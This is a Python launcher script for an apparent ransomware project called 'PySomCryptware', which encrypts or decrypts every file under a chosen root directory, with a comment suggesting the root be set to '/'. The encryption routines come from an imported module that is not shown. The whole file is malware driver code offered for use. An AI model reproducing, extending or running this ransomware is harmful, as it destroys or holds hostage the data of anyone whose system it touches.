#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "winterrdog"
__license__ = "GPL 3.0"
__version__ = "1.0.0"
__email__ = "winterrdog@protonmail.ch"
__status__ = "Development"

from lib import core


def lets_gerrit():
    args = core.get_cmdline_args()

    lc_root = "."  # change it to suite your needs, maybe sth like '/' :)
    if args["action"] == "encrypt":
        r = core.PySomCryptware()
        r.start_crypting(lc_root)
    elif args["action"] == "decrypt":
        if args["keyfile"]:
            r = core.PySomCryptware(keyfile=args["keyfile"])
            r.start_crypting(lc_root, False)
        else:
            r = core.PySomCryptware()
            r.start_crypting(lc_root, False)


if __name__ == "__main__":
    import sys

    lets_gerrit()
    sys.exit(0)
